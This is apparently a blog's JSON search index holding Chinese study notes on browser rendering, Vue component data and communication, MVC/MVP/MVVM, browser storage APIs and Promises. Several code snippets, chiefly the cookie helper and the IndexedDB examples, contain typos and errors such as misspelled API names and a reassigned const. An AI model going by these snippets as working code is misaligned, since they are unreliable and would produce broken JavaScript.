location 读取重定向的地址，然后重新发送请求；若返回的是 200 ，则继续进行导航流程 ​ 浏览器根据 content-type 进行区分返回的类型，若返回的是 下载类型，则将其提交给浏览器的下载管理器，导航结束；若返回的是 html 页面则开始准备渲染进程 准备渲染进程 默认请求下会开启一个新的 渲染进程，但是如果是开启同一个站点的页面时，会复用原来的渲染进程。此时还不能进行文档解析，文档还在网络进程中，得等到文档提交后 提交文档阶段 浏览器进程向渲染进程发送 提交文档 — 响应数据 的消息，渲染进程接收到后，与网络进程创建一个可以传输数据的管道，当响应数据传输完成后，渲染进程向浏览器进程发送 确认提交文档 的消息，此时浏览器会更新页面状态，包括 地址栏url、历史状态、web页面 渲染阶段 渲染进程开始页面解析和子资源下载 1.2 渲染流程 构建 DOM 树 - dom：渲染进程将 HTML 内容转化为可以理解的 DOM 树结构 计算布局 - style：渲染引擎将 CSS 样式文件转化为浏览器可以理解的 stylesheets，并计算节点的样式 生成布局树 - layout：创建布局树，并计算元素的布局信息 分层 - layer：对布局树进行分层，并生成分层树 图层绘制 - paint：为每个图层生成绘制列表，并提交给合成线程 光栅化操作 - tiles raster：合成线程将图层分成图块，并在光栅化线程池中将图块生成位图 合成 - drawquad：合成进程将绘制图块命令 drawquad 发送给浏览器进程 显示 - display：浏览器进程根据 drawquad 消息合成页面，并显示在显示器上 2. 简便流程 2.1 导航流程 用户输入 url 并回车 浏览器进程检查 url，组装协议，构成完整的 url 浏览器进程通过进程间通信 IPC 把 url 请求发送给网络进程 网络进程接收到url 请求后检查本地缓存是否缓存了该请求资源，如果有则将该资源返回给浏览器进程 如果没有，网络进程向服务器发起 http 网络请求： 进行 DNS 解析，获取服务器 ip地址 利用 ip 与 服务器建立 tcp 连接 构建请求头信息 发送请求头信息 服务器响应后，网络进程接收响应头和响应信息，并解析响应内容 网络进行解析响应信息： 检查状态码，如果是 301 / 302，则需要重定向，从 location 读取地址，重新进行第四步，如果是 200 则继续处理请求 200 响应处理：检查响应类型 Content - Type，如果是字节流类型，则将该请求提交给下载管理器，该导航流程结束，如果是 html 则通知浏览器进程准备 渲染进程 准备渲染 准备渲染进程，浏览器进程检查当前 url 是否跟之前打开的渲染进程 根域名 是否相同。如果相同，则复用原来的进程，如果不同，则开启新的渲染进程 传输数据，更新状态 渲染进程准备好后，浏览器向渲染进程发起 提交文档 消息，渲染进程 接收到消息和网络进程建立传输数据的管道 渲染进程接收完数据后，向浏览器发送 确认提交 浏览器进程接收到确认消息后，更新浏览器界面状态：安全、地址栏 url、前进后退的历史状态、更新 web 页面 2.2 渲染流程 构建 DOM 树 计算布局 生成布局树 分层 图层绘制 光栅化操作 合成 显示 3. 相关概念 重排 重绘 合成 3.1 重排 — 更新了元素的几何属性 若 通过 js 或者 css 修改元素的几何位置，那么浏览器会触发重新布局，解析之后的一系列子阶段，这个过程是重排，重排需要更新完整的渲染流水线，所以开销最大。 3.2 重绘 — 更新元素的绘制属性 若改变元素的背景颜色，那么布局阶段不会被执行，因为没有引起几何位置的交换，就直接进入了绘制阶段，然后执行之后的一系列子阶段，这个过程是重绘。相较于重排操作，重绘省去了布局和分层阶段，所以执行效率比重排高。 3.3 合成 渲染引擎跳过布局和绘制，只执行后续的合成操作，这个过程是合成。eg 使用 css3的 transfrom 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。效率最高。","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"网络","slug":"网络","permalink":"https://shylees.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"为什么 data 属性是一个函数而不是一个对象？","slug":"further/02 组件中的data是函数","date":"2021-12-06T16:00:00.000Z","updated":"2021-12-06T16:00:00.000Z","comments":false,"path":"furtherNotes/further/02 组件中的data是函数","link":"furtherNotes/further/02 组件中的data是函数","permalink":"https://shylees.github.io/furtherNotes/further/02%20%E7%BB%84%E4%BB%B6%E4%B8%AD%E7%9A%84data%E6%98%AF%E5%87%BD%E6%95%B0","excerpt":"","text":"参考链接: https://vue3js.cn/interview/vue/data.html 1. 实例和组件定义 data 的区别 vue 实例的时候定义 data 属性可以是对象也可以是函数 123456789const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; // 对象 foo:&quot;foo&quot; &#125;, data()&#123; //函数 return &#123; foo:&quot;foo&quot; &#125; &#125; &#125;) 组件中定义 data 属性，只能是一个函数，如果直接定义为一个对象，会报警告 警告说明：返回的 data 应该是一个函数在每一个组件实例中 2. 组件 data 定义函数与对象的区别 在定义好一个组件时， vue 最终会通过 vue.extend() 构成组件实例 当组件定义 data 属性时，采用对象的形式，在使用该组件创建多个组件实例的时候，当一个组件修改了data里面的值，其他组件的 data 也会被修改。 but 采用函数的形式时，就不会出现这种请求，因为函数返回的对象内存地址不相同，修改一个实例 data 时，其他组件实例 data 不受影响 3. 结论 根实例对象 data 可以是对象也可以是函数，根实例是单例，不会产生数据污染的情况 组件实例对象 data 必须是函数，目的是为了防止多个组件实例对象之间共用一个 data，产生数据污染。采用函数的形式，initData 时会将其作为工厂函数都会返回全新 data 对象","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"vue组件通信的方式","slug":"further/03 vue组件通信","date":"2021-12-06T16:00:00.000Z","updated":"2021-12-06T16:00:00.000Z","comments":false,"path":"furtherNotes/further/03 vue组件通信","link":"furtherNotes/further/03 vue组件通信","permalink":"https://shylees.github.io/furtherNotes/further/03%20vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1","excerpt":"","text":"参考链接： https://juejin.cn/post/6844903887162310669 8 https://juejin.cn/post/6999687348120190983 12 https://vue3js.cn/interview/vue/communication.html 8 总结 父子之间的通信：props ; $parent / $children；provide / inject；ref ；$attrs / $listeners 兄弟组件通信：eventBus；vuex 跨级通信：eventBus；Vuex；provide / inject；$attrs / $listenters 组件通信有哪几种方式 1.props / $emit： 适用场景：父组件传递数据给子组件 / 子组件传递数据给父组件 父组件向子组件传递数据是通过 props 传递的，子组件传递数据给父组件是通过 $emit 触发事件 做到的 2. $children / $parent： 指定已创建的实例之父实例，在两者之间建立父子关系。子实例可以用 this.$parent 访问父实例，子实例被推入父实例的 $children 数组中。 $parent 是对象；$children 是数组 其目的主要是作为访问组件的应急方法，更推荐 props 和 event 实现父子通信 3. provide / inject： 父组件通过 provide 来提供变量，然后在子组件中通过 inject 来注入变量 12345678910111213141516171819202122232425262728// A.vue&lt;div&gt; &lt;comB&gt;&lt;/comB&gt; &lt;/div&gt;&lt;script&gt;export default&#123; name:&quot;A&quot;, provide:&#123; for: &quot;demo&quot; &#125;&#125;&lt;/script&gt;// B.vue&lt;div&gt; &#123;&#123; demo &#125;&#125; &lt;comC&gt;&lt;/comC&gt; &lt;/div&gt;&lt;script&gt;export default&#123; name:&quot;B&quot;, inject:[&#x27;for&#x27;], data()&#123; return &#123; demo:this.for &#125; &#125;&#125;&lt;/script&gt;// C.vue&lt;div&gt; &#123;&#123; demo &#125;&#125; &lt;/div&gt;&lt;script&gt;export default&#123; name:&quot;C&quot;, inject:[&#x27;for&#x27;], data()&#123; return &#123; demo:this.for &#125; &#125;&#125;&lt;/script&gt; 4. ref / $refs 适用场景：父组件在使用子组件时设置 ref、父组件通过设置在子组件 refs 获取数据 ref 如果在普通的 dom 元素使用，引用指向的就是 dom 元素； 如果用在子组件上，引用就指向组件实例，可以通过实例直接调用组件的方法或访问数据 123456789101112131415161718192021// app.vue&lt;div&gt; &lt;comA ref=&quot;comA&quot;&gt;&lt;/comA&gt; &lt;/div&gt;&lt;script&gt;export default&#123; mounted()&#123; const comA = this.$refs.comA; const nameA = comA.name; &#125;&#125;&lt;/script&gt;// comA.vue&lt;script&gt;export default&#123; data()&#123; return &#123; name:&#x27;A&#x27; &#125; &#125;&#125;&lt;/script&gt; 5. eventBus 使用场景：兄弟组件传值 事件总线，在 vue 中可以使用其作为沟通桥梁的概念，就像是所有组件共用相同的事件中心，可以向该中心注册发送事件或接收事件，所有组件都可以通知其他组件。当项目比较大的时候，容易造成难以维护的灾难。 12345678910111213141516171819202122232425262728293031323334353637383940// 1. 初始化// event-bus.jsimport Vue from &#x27;vue&#x27;export const EventBus = new Vue()// 2. 发送事件// showNumCom 和 additionNumCom 是兄弟组件 其实是父子也可以// additionNum.vue&lt;div&gt; &lt;button @click=&quot;additionHandle&quot; &gt;+&lt;/button&gt; &lt;/div&gt;import &#123;EventBus&#125; from &#x27;./event-bus.js&#x27;export default &#123; data()&#123; return &#123; num:1 &#125; &#125;, methods:&#123; additionHandle()&#123; EventBus.$emit(&#x27;addition&#x27;,&#123; num: this.num++ &#125;) &#125; &#125;&#125;// 3. 接收事件// showNum.vue&lt;div&gt; 计算和:&#123;&#123;count&#125;&#125; &lt;/div&gt;import &#123;EventBus&#125; from &#x27;./event-bus.js&#x27;export default &#123; data()&#123; return &#123; count:0 &#125; &#125;, mounted()&#123; EventBus.$on(&#x27;addition&#x27;,param =&gt; &#123; this.count = this.count + param.num; &#125;) &#125;&#125;// 实现了在组件 additionNum 中点击 + ，在 showNum 中利用传递来的 num 展示求和的结果// 4. 溢出事件监听者import &#123;eventBus&#125; from &#x27;event-bus.js&#x27;EventBus.$off(&#x27;addition&#x27;,&#123;&#125;) 6. Vuex vuex 是一个专门为 vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组建的 状态，并以相应的规则保证状态以一种可预测的方式发生变化。vuex 解决了 多个视图依赖于同一状态 和 来自不同视图的行为需要变更同一状态 的问题，讲开发者的精力聚焦于数据的更新而不是数据在组件之间的传递上 state：用于数据的存储，是 store 中的唯一数据源 getters：如 computed，基于 state 数据的二次包装，常用于数据的筛选和多个数据的相关性计算 mutations：类似函数，改变 state 数据的唯一途径，且不能用于处理异步事件 actions：类似于 mutation，用于提交 mutation 来改变状态，而不直接变更状态，可以包含任意异步操作 modules：类似命名空间，用于项目中将各个模块的状态分开定义和操作 7. localStorage / seesionStorage 8. $attrs / $listeners 使用场景：祖先传递数据给子孙 $attrs：包含父作用域里除 class 和 style 除外的非 props 属性集合。通过 this.$attrs 获取父作用域中所有符合条件的属性集合，若还要继续传给子组件内部的其他组件，可以通过 v-bind=‘$attrs’ $listeners：包含父作用域里 .native 除外的监听事件集合。如果还要继续传给子组件内部的其他组件，可以通过 v-on=“$linteners” inheritAttrs 123456789101112131415// parent.vue&lt;child name=&quot;name&quot; title=&#x27;111&#x27;&gt;&lt;/child&gt;// child.vue&lt;sun-child v-bind=&quot;$attrs&quot;&gt;&lt;/sun-child&gt;&lt;script&gt;export defalut&#123; props:[&#x27;name&#x27;], //这里可以接收也可不接收，if接收，this.$arrts 中就会少一个值 mounted()&#123; console.log(this.$attrs); // &#123;title:111&#125; , // if 上无接收 &#123;name:&#x27;name&#x27;,...&#125; &#125;, inheritAttrs: false, // 可以关闭自动挂载到组件根元素上的没有在props声明的属性&#125;&lt;/script&gt;","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"MVC MVP MVVM","slug":"further/01 MVC MVP MVVM","date":"2021-12-05T16:00:00.000Z","updated":"2021-12-05T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 MVC MVP MVVM","link":"furtherNotes/further/01 MVC MVP MVVM","permalink":"https://shylees.github.io/furtherNotes/further/01%20MVC%20MVP%20MVVM","excerpt":"","text":"整理 MV 系列框架概念 http://c.biancheng.net/view/7743.html 1. MVC 框架 MVC 框架流程图 和 框架图 如下（实线表示调用，虚线表示通知）在 Controller 控制层会接收用户的所有操作，并根据写好的代码进行相应的操作 特点：controller 控制 model 层将数据赋值给 view 层。 缺点：MVC 框架的大部分 逻辑和代码量 都集中在 controller 层，这带给 controller 层造成很大压力，且已经有独立处理事件能力的 view 层没有用到；controller 和 view 之间是一一对应的，断绝了 view 层复用的可能，因此产生了很多冗余的代码 注：controller 触发 view 时，并不会更新 view 层中的数据， ​ view 中的数据是通过监听 model 数据变化而自动更新的，与 controller 无关 2. MVP 框架 MVP — Model View Presenter MVP 框架流程图 和 框架图 如下， 在 MVC 中，view 可以通过访问 Model 来更新，但在 MVP 中，View 不能直接访问 Model ，必须通过 Presenter 提供的接口，然后 Presenter 再去访问 Model。 特点：Model 和 View 都必须通过 Presenter 来传递信息，所以完全分离了 View 和 Model ，双方不知道彼此的存在；因为 View 和 Model 没有关系，所以 View 可以抽离出来做成组件，在复用上比较好。 缺点：因为 View 和 Model 都需要经过 Presenter，致使 Presenter 比较复杂，维护起来会有一定问题；而且因为没有绑定数据，所有数据都需要 Presenter 进行 “手动同步”，代码量比较大，也会有比较多的冗余。 为了让 View 和 Model 的数据始终保持一致，避免同步，推出了 MVVM 框架： 3. MVVM 框架 MVVM 框架流程图 和 框架图 如下： VM：ViewModel 把 Model 和 View 的数据同步自动化了，解决了 MVP 中数据同步比较麻烦的问题，不仅减轻了 ViewModel 的压力，同时使得数据处理更加方便 — 只需告诉 View 展示的数据是 Model 中的哪部分即可。 特点：ViewModel 双向绑定了 View 和 Model，因此，随着 View 的数据变化，系统会自动修改 MOdel 的数据，反之同理。 而 Presenter 是采用手动写方法来调用或者修改 View 和 Model。 双向数据绑定：双向数据绑定是一个模板引擎，它会根据数据的变化实时渲染，如图，View 和 Model 之间的修改都会同步到对方。 MVVM 中数据绑定方法一般有以下3种： 数据劫持 发布 - 订阅模式 脏值检查 其中 Vue.js 用的就是发布 - 订阅模式，**Observer（数据监听器）**用户监听数据变化，如果数据变化，不论是在 View 还是 Model，Observer 都会知道，然后告诉 Watcher（订阅者）。**Compiler（指定解析器）**的作用是对数据进行解析，之后绑定指定的事件，在这主要用于更新视图。 Vue.js 数据绑定的流程：首先将需要绑定的数据用数据劫持方法找出来，之后用 Observer 监听这堆数据，如果数据发生变化，Observer 就会告诉 Watcher，然后 Watcher 会决定让哪个 Compiler 去做相应的操作，这就完成了数据的双向绑定。 4. 简述 3 种 框架 及其区别 MVC：model 层存放数据逻辑，view 层用于显示数据，controller 层用于将 model 层的数据赋值给 view 层，而在 model 层数据变化的时候， view 在监听到后再修改显示的数据，即 view 是可以访问到 model 的 其实 所有处理业务的逻辑都在 controller 层上了，controller 压力繁重，而且 controller 层 跟 view 层其实算是一一对应的关系，所以代码难以复用 MVP：此时 model 层和 view 层是不知道彼此的存在的，当 model 数据变化后，需要经过 presenter 层反馈给 view 层，然后才进行改变， 因为没有数据绑定，所有数据都要经过 presenter 手动同步，使得 presenter 代码繁重 MVVM：viewModel 层实现了model 和 view 的双向数据绑定，当一方数据改变的时候，就会经过 viewModel 将另一方的数据同步更改。 发布者订阅模式：将要绑定的数据用数据劫持的方法找出来，用 数据监听器 observer 监听数据变化，当数据变化时，告诉 订阅者 Watcher，订阅者 找到适合的 指定解析器 去完成相应操作，完成了数据绑定","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"浏览器存储精简版","slug":"further/01 浏览器存储特点及区别","date":"2021-12-04T16:00:00.000Z","updated":"2021-12-04T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 浏览器存储特点及区别","link":"furtherNotes/further/01 浏览器存储特点及区别","permalink":"https://shylees.github.io/furtherNotes/further/01%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8%E7%89%B9%E7%82%B9%E5%8F%8A%E5%8C%BA%E5%88%AB","excerpt":"","text":"觉得还是复习的不够 https://zhuanlan.zhihu.com/p/128155801 https://juejin.cn/post/7012506796489359368 **1. cookie ** 生命周期为在cookie设置的过期时间之前一直有效，即使窗口或者浏览器关闭； 存放数据大小为4K； 有存储个数限制（各浏览器不同），一般不超过20个； 与服务器端通信，每次都会携带在HTTP头中，cookie存储数据过多会带来性能问题； 有安全问题，在 HTTP 请求中的 Cookie 是明文传递的； 只能存储字符串 由于第三方Cookie的滥用，所以很多老司机在浏览网页时会禁用Cookie，所以我们不得不测试用户是否支持Cookie，这也是很麻烦的一件事 2. session 3. localStorage 生命周期永久，除非用户手动代码清除浏览器中的 localStorage 信息，否则永远存在 存放数据大小一般为 5MB 仅在浏览器中保存，不参与服务器通信 作用域为文档源级别，即同源的才能共享，可以互相读取对方的数据，甚至覆盖；但也受浏览器的限制 4. sessionStorage 仅在当前会话下有效，关闭页面或者浏览器后被清除； 存放数据大小一般为5MB； 仅在浏览器中保存，不参与服务器通信； 可以接受源生接口，亦可以再次封装来对Object和Array有更好的支持；","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"html5","slug":"html5","permalink":"https://shylees.github.io/tags/html5/"}]},{"title":"Promise基本用法","slug":"further/03 Promise","date":"2021-11-25T16:00:00.000Z","updated":"2021-12-02T16:00:00.000Z","comments":false,"path":"furtherNotes/further/03 Promise","link":"furtherNotes/further/03 Promise","permalink":"https://shylees.github.io/furtherNotes/further/03%20Promise","excerpt":"","text":"2021.11.26 建的文件 12.3 终于打算写了 回调地狱 解决方案中 Promise 常见 promise 输出题：https://juejin.cn/post/6844904077537574919 https://juejin.cn/post/6844903607968481287 https://juejin.cn/post/6844903607968481287 https://juejin.cn/post/6952083081519955998 Promise 1. 简介 Promise 是异步编程的一种解决方案： 从语法上讲，promise 是一个对象，它可以获取异步操作的消息； 从本意上讲，promise 是承诺，承诺它过一段时间会给你一个结果。 promise 有三种状态：pending(等待态)、fulfiled(成功态)、rejected(失败态)；状态一旦改变，就不会再变。创建 promise 实例后，其会立即执行。 Pending 变为 Fulfilled 会得到一个私有value，Pending 变为 Rejected会得到一个私有reason，当Promise达到了Fulfilled或Rejected时，执行的异步代码会接收到这个value或reason promise 解决的问题： 回调地狱，代码难以维护，常常第一个函数的输出是第二个函数的输入的这种现象 promise 可以支持多个并发的请求，获取并发请求中的数据 promise 可以解决异步的问题，但是不能说 promise 是异步的 2. 基本用法 resolve ：异步操作执行成功后的回调函数 reject ：异步操作执行失败后的回调函数 then ：捕获 promise 状态变化（成功 / 错误），并将拿到的数据进行操作 catch：相当于 then(null,error =&gt; { … } )，then 的第二个参数 all：接收一个promise 实例数组参数，返回一个以传入数组顺序的返回结果的数组，提供了并行执行异步操作的能力，在所有异步操作执行完后才执行回调 1234567891011let Promise1 = new Promise(function(resolve, reject)&#123;&#125;)let Promise2 = new Promise(function(resolve, reject)&#123;&#125;)let Promise3 = new Promise(function(resolve, reject)&#123;&#125;)let p = Promise.all([Promise1, Promise2, Promise3])p.then(funciton()&#123; // 三个都成功则成功 &#125;, function()&#123; // 只要有失败，则失败 &#125;) race：接收一个Promise 实例数组参数，返回最快执行完的操作结果 使用场景：可以用 race 给某个异步请求设置超时时间，并且在超时后执行相应的操作","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"es6","slug":"es6","permalink":"https://shylees.github.io/tags/es6/"},{"name":"promise","slug":"promise","permalink":"https://shylees.github.io/tags/promise/"}]},{"title":"浏览器存储详细版","slug":"further/01 浏览器存储","date":"2021-11-19T16:00:00.000Z","updated":"2021-11-19T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 浏览器存储","link":"furtherNotes/further/01 浏览器存储","permalink":"https://shylees.github.io/furtherNotes/further/01%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8","excerpt":"","text":"由cwenjoy 项目中使用到的 localStorage 引申出来的 https://www.jianshu.com/p/072e17112759 浏览器存储 常见的浏览器数据存储方案 Cookie Web 存储 ：localStorage 和 sessionStorage IndexedDB 1. Cookie 1.1 简介 Cookie 又称 HTTP Cookie，最初在客户端用于存储会话信息，从底层看，其作为 HTTP 协议的一种扩展实现，Cookie 数据会自动在 Web 浏览器和 Web 服务器之间传输，因此在服务器端脚本可以读写存储的 cookie 值，因此 Cookie 通常用户存储一些通用的数据。 1.2 优点 相比于其他的存储方式， Cookie 的兼容性很好 1.3 缺点 存储量小，在不同的浏览器上基本都是 4kb 大小 影响性能，Cookie 会由浏览器作为请求头发送，当 Cookie 存储信息过多时，会影响特定域的资源获取效率，增加文件传输的负载 只能存储字符串 安全问题，存储在 Cookie 的任何数据可以被他人访问，因此不能再 Cookie 中存储重要信息 因为第三方滥用 Cookie，所以很多人再浏览网页时会禁用 Cookie，所以得测试用户是否支持 Cookie 1.4 操作 基本操作：读取、写入、删除。 cookie 中所有的名字和值都是经过 URI 编码的，所以必须使用 decodeURICompoent来进行解码才能得到 cookie 的值。 12345678910111213141516171819202122232425262728293031323334353637var CookieUtil = &#123; // get可根据cookie的名字获取相应的值 get: function() &#123; const cookieName = encodeURIcOMPONET(name) + &quot;=&quot;, cookieStart = document.cookie.indexOf(cookieName), cookieValue = null if(cookieStart &gt; -1) &#123; const cookieEnd = document.cookie.indexOf(&quot;;&quot;, cookieStart) if(cookieEnd == -1) &#123; cookieEnd = document.cookie.length &#125; cookieValue = decodeURICompoent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd)) &#125; return cookieValue &#125; // set设置一个cookie set: function(name, value, expires, path, domain, secure) &#123; var cookieText = encodeURIComponet(name)+&quot;=&quot;+encodeURIComponet(value) if(expires instanceof Date) &#123; cookieText += &quot;; expires=&quot; + expires.toGMTString() &#125; if(path) &#123; cookieText += &quot;;path=&quot; + path &#125; if(domain) &#123; cookieText += &quot;; domain&quot; + domain &#125; if(secure) &#123; cookieText += &quot;; secure&quot; &#125; document.cookie = cookieText &#125; // 删除已有的cookie unset: function(name, path, domain, secure) &#123; this.set(name, &quot;&quot;, new Date(0), path, domain, secure) &#125;&#125; 2. Web 存储 web 存储机制最初作为 HTML5 的一部分被定义成 API 的形式，但由于其本身的独特性于一些原因被剥离出来，成为一个独立的标准。其包括 localStorage 对象 和 sessionStorage 对象。 其产生的主要原因： 希望有一种再 cookie 之外存储会话数据的途径 希望有一种存储大量可以跨会话存在的数据的机制 最初的 web 存储规范中包含了 sessionStorage 和 globalStorage 两种对象的定义，在支持这两个对象的浏览器中都是以 windows 对象属性的形式存在的 3. localStorage 3.1 简介 localStorage 对象作为 持久保存客户端数据的方案 取代了 globalStorage。 从功能上讲，可以通过 localStorage 在浏览器存储键值对数据，相比于 cookie，提供了更为直观的 API，在安全上相对好一点。 虽然 localStorage 只能存储字符串，但也可以存储字符串化的 JSON 数据，因此相比 cookie ，localStorage 能存储更复杂的数据。 3.2 优点 提供了简单明了的 API 来进行操作 更加安全 可存储的数据量更大 3.3 语法 12345678910// 使用方法存储数据localStorage.setItem(&quot;name&quot;, &quot;Srtian&quot;)// 使用属性存储数据localStorage.say = &quot;Hello world&quot;// 使用方法读取数据const name = localStorage.getItem(&quot;name&quot;)// 使用属性读取数据const say = localStorage.say// 删除数据localStorage.removeItem(&quot;name&quot;) 需要传输其他格式的数据时，我们就需要将这些数据全部转换为字符串格式，然后再进行存储 获取值时将其转化回来 1234const user = &#123;name:&quot;Srtian&quot;, age: 22&#125;localStorage.setItem(&quot;user&quot;, JSON.stringify(user))var age = JSON.parse(localStorage.user) 3.4 存储数据的有效期 与 作用域 通过localStorage存储的数据时永久性的，除非我们使用removeItem来删除或者用户通过设置浏览器配置来删除，负责数据会一直保留在用户的电脑上，永不过期。 localStorage的作用域限定在文档源级别的（意思就是同源的才能共享），同源的文档间会共享localStorage的数据，他们可以互相读取对方的数据，甚至有时会覆盖对方的数据。当然，localStorage的作用域同样也受浏览器的限制。 4. sessionStorage 4.1 简介 与 localStorage 相似，不同之处在于 localStorage里面存储的数据没有过期时间设置，而Session Storage只存储当前会话页的数据，且只有当用户关闭当前会话页或浏览器时，数据才会被清除。 4.2 语法 1234567891011// 保存数据到sessionStoragesessionStorage.setItem(&#x27;name&#x27;, &#x27;Srtian&#x27;);// 从sessionStorage获取数据var data = sessionStorage.getItem(&#x27;name&#x27;);// 从sessionStorage删除保存的数据sessionStorage.removeItem(&#x27;name&#x27;);// 从sessionStorage删除所有保存的数据sessionStorage.clear(); 5. indexedDB 5.1 简述 由HTML5所提供的一种本地存储，用于在浏览器中储存较大数据结构的 Web API，并提供索引功能以实现高性能查找。它一般用于保存大量用户数据并要求数据之间有搜索需要的场景，当网络断开时，用户就可以做一些离线的操作。它较之SQL更为方便，不需要写一些特定的语法对数据进行操作，数据格式是JSON。 5.2 语法 创建数据库 并 指定数据库版本号 12// 注意数据库的版本号只能是整数const request = IndexedDB.open(databasename, version) 生成处理函数 123456789request.onerror = function() &#123; // 创建数据库失败时的回调函数&#125;request.onsuccess = function() &#123; // 创建数据库成功时的回调函数&#125;request.onupgradeneededd = function(e) &#123; // 当数据库改变时的回调函数 唯一可以修改数据库结构的地方 可以创建和删除对象存储空间以及构建和删除索引&#125; 建立对象存储空间 12345// 对象存储空间仅调用createObjectStore()就可以创建。这个方法使用存储空间的名称，和一个对象参数。即便这个参数对象是可选的，它还是非常重要的，因为它可以让我们定义重要的可选属性和完善你希望创建的对象存储空间的类型。request.onupgradeneeded = function(event) &#123; const db = event.target.result const objectStore = db.createObjectStore(&#x27;name&#x27;, &#123; keyPath:&#x27;id&#x27; &#125;)&#125; 操作数据 添加数据 123456789101112addData: function(db, storename, data) &#123; const store = store = db.transaction(storename, &#x27;readwrite&#x27;).objectStore(storename) for(let i = 0; i &lt; data.length; i++) &#123;! const request = store.add(data[i]) request.onerror = function() &#123; console.error(&#x27;添加数据失败&#x27;) &#125; request.onsuccess = function() &#123; console.log(&#x27;添加数据成功&#x27;) &#125; &#125;&#125; 修改数据 123456789101112putData: function(db, storename, data) &#123; const store = store = db.transaction(storename, &#x27;readwrite&#x27;).objectStore(storename) for(let i = 0; i &lt; data.length; i++) &#123;! const request = store.put(data[i]) request.onerror = function() &#123; console.error(&#x27;修改数据失败&#x27;) &#125; request.onsuccess = function() &#123; console.log(&#x27;修改数据成功&#x27;) &#125; &#125;&#125; 获取数据 1234567891011getDataByKey: function(db, storename, key) &#123; const store = store = db.transaction(storename, &#x27;readwrite&#x27;).objectStore(storename)! const request = store.get(key) request.onerror = function() &#123; console.error(&#x27;获取数据失败&#x27;) &#125; request.onsuccess = function(e) &#123; const result = e.target.result console.log(result) &#125;&#125; 删除数据 12345deleteDate: function(db, storename, key) &#123; const store = store = db.transaction(storename, &#x27;readwrite&#x27;).objectStore(storename)! store.delete(key) console.log(&#x27;已删除存储空间&#x27; + storename + &#x27;中的&#x27; + key + &#x27;纪录&#x27;)&#125; 关闭数据库 1db.close 5.3 优点 与其他相比 拥有更大的存储空间 能够处理更为复杂和结构化的数据 拥有更多的交互控制 每个 database 中可以拥有多个 database 和 table 5.4 局限性 存储空间限制：一个单独的数据库项目大小没有限制，但可能会限制每个 IndexedDB 数据库的大小，不同浏览器有不同限制； 兼容性问题：兼容性比前面提及的存储方案差 受同源策略限制：把存储空间绑定到了创建它的站点的源，所以不能被其他源访问","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"html5","slug":"html5","permalink":"https://shylees.github.io/tags/html5/"}]},{"title":"回调地狱及其解决方案","slug":"further/03 回调地狱解决","date":"2021-11-19T16:00:00.000Z","updated":"2021-11-25T16:00:00.000Z","comments":false,"path":"furtherNotes/further/03 回调地狱解决","link":"furtherNotes/further/03 回调地狱解决","permalink":"https://shylees.github.io/furtherNotes/further/03%20%E5%9B%9E%E8%B0%83%E5%9C%B0%E7%8B%B1%E8%A7%A3%E5%86%B3","excerpt":"","text":"同步异步 promise 引申 https://www.cnblogs.com/sonsmart/p/15265626.html 1. 回调地狱 1.1 先导概念 回调函数：当一个函数作为参数传入另一个参数中，其不会立即执行，只有当满足一定条件后该函数才可以执行，这种函数称为回调函数。 其中定时器和ajax就存在回调函数 eg： 123setTimeout(function()&#123; console.log(&#x27;执行回调函数&#x27;);&#125;,3000) 1234let xhr = new XMLHttpRequest();xhr.onreadystatechange = function()&#123; ... &#125;xhr.open(...);xhr.send(); 上面的回调函数分别为：function(){ console.log() }、和onreadystatechange 绑定的函数，其中的执行条件分别为 3秒后 和 send发送请求并拿到响应后执行。 同步任务：在主线程上排队执行，只有前一个任务执行完毕，才能执行下一个任务。 异步任务：不进入主线程，而是进入异步队列，前一个任务是否执行完毕不影响下一个任务的执行。 eg： 1234setTimeout(function()&#123; console.log(&#x27;执行回调函数&#x27;);&#125;,3000)console.log(&#x27;111&#x27;); 这种不阻塞后面任务执行的任务就叫异步任务。 1.2 回调地狱 — 为了在异步函数当中顺序执行代码而不断嵌套调用回调函数 eg： 123456789setTimeout(function()&#123; console.log(&#x27;first&#x27;); setTimeout(function()&#123; console.log(&#x27;sencond&#x27;); setTimeout(function()&#123; console.log(&#x27;thrid&#x27;) &#125;,1000) &#125;,1000)&#125;,1000) 这种回调函数中嵌套回调函数的情况就是回调地狱 总结：**回调地狱就是为了实现代码顺序执行而出现的一种操作，**它会造成代码可读性差，后期不好维护。 2. 如何解决回调地狱 Promise：编写异步代码的一种方式，它仍然以自顶向下的方式执行，并且由于鼓励使用try / catch 样式错误处理而处理更多类型的错误 generators 生成器可以让你暂停单个函数，而不会暂停整个程序的状态，但代码稍微复杂一些，以使代码看起来像自上而下地执行 async / await 异步函数是一个建议的 es7 功能，将以更高级别的语法进一步包装生成器和承诺 2.1 Promise 2.2 Generators 2.3 async / 